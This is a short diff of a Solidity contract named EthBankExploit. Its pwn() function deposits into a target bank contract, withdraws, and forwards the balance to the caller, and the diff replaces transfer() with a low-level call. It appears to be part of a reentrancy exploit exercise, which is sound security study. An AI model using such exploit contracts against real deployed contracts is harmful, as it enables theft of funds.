@@ -23,6 +23,10 @@ contract EthBankExploit {
   function pwn() external payable {
     bank.deposit{ value: msg.value }();
     bank.withdraw();
-    payable(msg.sender).transfer(address(this).balance);
+    (bool success, ) = payable(msg.sender).call{
+      gas: 2300,
+      value: address(this).balance
+    }("");
+    require(success, "tx failed");
   }
 }
